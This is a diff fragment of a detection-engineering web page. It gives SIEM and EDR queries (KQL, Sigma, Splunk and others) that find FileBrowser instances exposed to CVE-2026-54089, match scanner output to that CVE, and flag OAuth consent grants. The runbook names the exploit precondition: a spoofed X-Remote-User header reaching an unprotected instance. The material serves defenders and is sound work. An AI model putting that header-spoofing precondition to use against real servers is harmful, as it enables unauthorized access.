+    <button class="share-btn" data-share-uc="b03f1bae96" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Surfaces FileBrowser processes started with proxy authentication enabled (auth.method=proxy plus an auth.header such as X-Remote-User), which is the precondition that makes CVE-2026-54089 exploitable. This is a proactive exposure hunt on endpoint process telemetry to inventory at-risk hosts before, or independently of, any live exploitation — pair the results with the direct-external-access UC to prioritise instances that are both proxy-auth and network-exposed.
+
+Rationale: Article states the vuln is &#x27;NOT exploitable on default configuration&#x27; and requires auth.method=proxy with an auth.header (default X-Remote-User); inventorying processes launched with these flags directly enumerates exploitable hosts. Uses the exact config tokens (auth.method, auth.header, X-Remote-User) and the filebrowser binary name. Defender/Falcon/ImProcessCreate are viable because this is host process telemetry, not HTTP. CloudWatch blank: not AWS-native. NOTE flags the coverage gap for env-var/config-file deployments where flags aren&#x27;t on the command line.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+  • https://filebrowser.org/authentication.html
+  • https://advisories.gitlab.com/golang/github.com/filebrowser/filebrowser/v2/CVE-2026-54089/</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Gather Victim Host Information: Hardware/Software">T1592.001</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>A correctly-hardened instance bound to 127.0.0.1 behind a proxy that strips client headers (proxy-auth enabled but not exploitable)</li><li>Non-production/test FileBrowser instances intentionally running proxy auth</li><li>A container image rebuild re-launching the same safe config repeatedly</li><li>Config-management (Ansible/Helm) restarts re-emitting the same flags</li><li>Legacy proxy-auth deployment already firewalled at the network layer</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: for each flagged host, determine the listen bind address (127.0.0.1 vs 0.0.0.0) and whether the port is reachable from untrusted networks — correlate with the direct-external-access UC. 2) Contain: for exposed instances, restrict the port to the reverse-proxy egress only and configure the proxy to strip/overwrite the identity header on inbound client requests. 3) Hunt: on confirmed-exposed hosts, pull proxy/WAF logs for /api/login requests carrying X-Remote-User from non-proxy sources and audit the FileBrowser user list for accounts created via the auto-creation primitive.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc5-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-269-uc5-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-269-uc5-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-269-uc5-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-269-uc5-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-269-uc5-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc5-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
+| where Timestamp &gt; ago(30d)
+| where FileName has &quot;filebrowser&quot;
+| where ProcessCommandLine has &quot;proxy&quot;
+      and (ProcessCommandLine has &quot;auth.method&quot; or ProcessCommandLine has &quot;--auth.header&quot; or ProcessCommandLine has &quot;X-Remote-User&quot;)
+| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine
+| order by Timestamp desc
+// NOTE: only catches flag-based config; env-var (FB_AUTH_METHOD) or config.json/DB config will not appear in cmdline</code></pre></div>
+    <div class="tab-content" id="art-269-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
+| where TimeGenerated &gt; ago(30d)
+| where TargetProcessName has &quot;filebrowser&quot;
+| where TargetProcessCommandLine has &quot;proxy&quot;
+      and (TargetProcessCommandLine has &quot;auth.method&quot; or TargetProcessCommandLine has &quot;auth.header&quot; or TargetProcessCommandLine has &quot;X-Remote-User&quot;)
+| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-269-uc5-sigma"><pre><button class="copy-btn">COPY</button><code>title: FileBrowser Started With Proxy Authentication Mode (CVE-2026-54089 Exposure)
+id: 5c8d1f2b-6a90-4e3c-b7d1-0a4f9e2c6d13
+description: Detects the FileBrowser binary launched with proxy authentication enabled (auth.method=proxy / auth.header), the exploitable precondition for CVE-2026-54089.
+references:
+  - https://github.com/advisories/GHSA-xqp3-jq6g-x3qm
+author: SOC Detection Engineering
+date: 2026/07/18
+tags:
+  - attack.t1190
+  - attack.t1592.001
+logsource:
+  category: process_creation
+detection:
+  selection_img:
+    Image|endswith:
+      - &#x27;/filebrowser&#x27;
+      - &#x27;\filebrowser.exe&#x27;
+  selection_cfg:
+    CommandLine|contains: &#x27;proxy&#x27;
+  selection_flag:
+    CommandLine|contains:
+      - &#x27;auth.method&#x27;
+      - &#x27;auth.header&#x27;
+      - &#x27;X-Remote-User&#x27;
+  condition: selection_img and selection_cfg and selection_flag
+level: medium</code></pre></div>
+    <div class="tab-content" id="art-269-uc5-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE (@process.command_line:*filebrowser* AND @process.command_line:*proxy* AND (@process.command_line:*auth.method* OR @process.command_line:*auth.header* OR @process.command_line:*X-Remote-User*))</code></pre></div>
+    <div class="tab-content" id="art-269-uc5-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ImageFileName=/filebrowser/i
+| CommandLine=/auth\.method[= ]+proxy|--auth\.header|X-Remote-User/i
+| groupBy([aid, ComputerName, ImageFileName, CommandLine], function=count())</code></pre></div>
+    <div class="tab-content" id="art-269-uc5-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc5-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count, values(Processes.process) as cmdlines, min(_time) as firstTime, max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=&quot;filebrowser*&quot; (Processes.process=&quot;*auth.method*proxy*&quot; OR Processes.process=&quot;*--auth.header*&quot; OR Processes.process=&quot;*X-Remote-User*&quot;) by Processes.dest, Processes.user, Processes.process_name | `drop_dm_object_name(Processes)` | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-269-uc5-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count, values(Processes.process) as cmdlines, min(_time) as firstTime, max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=&quot;filebrowser*&quot; (Processes.process=&quot;*auth.method*proxy*&quot; OR Processes.process=&quot;*--auth.header*&quot; OR Processes.process=&quot;*X-Remote-User*&quot;) by Processes.dest, Processes.user, Processes.process_name | `drop_dm_object_name(Processes)` | sort - lastTime</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
+  <summary>
+    <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
+    <span class="uc-phase">Reconnaissance</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="222a505c20" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Match vulnerability scanner output to the CVE(s) named in the article.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc6-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-269-uc6-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-269-uc6-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc6-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
+// partitions on Timestamp instead of scanning the full retention.
+DeviceTvmSoftwareVulnerabilities
+| where Timestamp &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-54089&quot;)
+| join kind=inner (DeviceInfo | where Timestamp &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-269-uc6-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
+// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
+// no Sentinel translation — track via Update / Heartbeat OS-version
+// gaps as a coarse approximation.
+DeviceTvmSoftwareVulnerabilities
+| where TimeGenerated &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-54089&quot;)
+| join kind=inner (DeviceInfo | where TimeGenerated &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId,
+          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-269-uc6-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc6-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc6-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc6-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-54089&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre><pre class="spl-mode-body" id="art-269-uc6-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-54089&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="e2349777f5" data-platforms="def,sent,sigma,spl" data-targets="azure">
+  <summary>
+    <span class="uc-title">OAuth consent / suspicious app grant</span>
+    <span class="uc-phase">Actions on Objectives</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="e2349777f5" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Cloud identity abuse: app gets high-priv scopes, often via consent phishing.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Steal Application Access Token">T1528</span> <span class="ind tech" title="Account Manipulation: Additional Cloud Credentials">T1098.001</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Authentication.Authentication</span> <span class="ind">CloudAppEvents</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-269-uc7-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-269-uc7-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-269-uc7-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-269-uc7-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-269-uc7-kql"><pre><button class="copy-btn">COPY</button><code>CloudAppEvents
+| where Timestamp &gt; ago(7d)
+| where ActionType in (&quot;Consent to application.&quot;,&quot;Add OAuth2PermissionGrant.&quot;,&quot;Add delegated permission grant.&quot;)
+| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
+          ActivityObjects, IPAddress, UserAgent</code></pre></div>
+    <div class="tab-content" id="art-269-uc7-sentinel"><pre><button class="copy-btn">COPY</button><code>// Entra ID directory audit — user / admin consent to a third-party app.
+AuditLogs
+| where TimeGenerated &gt; ago(7d)
+| where OperationName has &quot;Consent to application&quot;
+| where Result =~ &quot;success&quot;
+| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
+         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
+         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
+| project TimeGenerated, OperationName, User, AppName, AppId, Result
+| order by TimeGenerated desc
+</code></pre></div>
+    <div class="tab-content" id="art-269-uc7-sigma"><pre><button class="copy-btn">COPY</button><code>title: Entra ID Consent to Third-Party OAuth Application
+id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d05
+status: experimental
+description: |
+    User-driven consent to a third-party OAuth application — illicit-
+    consent attack precursor. Pair with first-time-seen-app heuristic
+    in your SIEM for higher fidelity.
+references:
+    - https://attack.mitre.org/techniques/T1528/
+author: Clankerusecase
+date: 2026/05/02
+tags:
+    - attack.t1528
+    - attack.persistence
+logsource:
+    product: azure
+    service: auditlogs
+detection:
+    selection:
+        OperationName: &#x27;Consent to application&#x27;
+        Result: &#x27;success&#x27;
+    condition: selection
+falsepositives:
+    - Legitimate first-time SaaS app onboarding
+level: medium
+</code></pre></div>
+    <div class="tab-content" id="art-269-uc7-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-269-uc7-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-269-uc7-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-269-uc7-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Authentication.Authentication
+    where Authentication.action=&quot;success&quot;
+      AND Authentication.signature IN (
+        &quot;Consent to application&quot;,
+        &quot;Add app role assignment grant to user&quot;,
+        &quot;Add OAuth2PermissionGrant&quot;,
+        &quot;Add delegated permission grant&quot;)
+    by Authentication.user, Authentication.app, Authentication.src, Authentication.signature
+| `drop_dm_object_name(Authentication)`</code></pre><pre class="spl-mode-body" id="art-269-uc7-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Authentication.Authentication
+    where Authentication.action=&quot;success&quot;
+      AND Authentication.signature IN (
+        &quot;Consent to application&quot;,
+        &quot;Add app role assignment grant to user&quot;,
+        &quot;Add OAuth2PermissionGrant&quot;,
+        &quot;Add delegated permission grant&quot;)
+    by Authentication.user, Authentication.app, Authentication.src, Authentication.signature
+| `drop_dm_object_name(Authentication)`</code></pre></div></div>
+  </div>
+</details></div>
 </article>
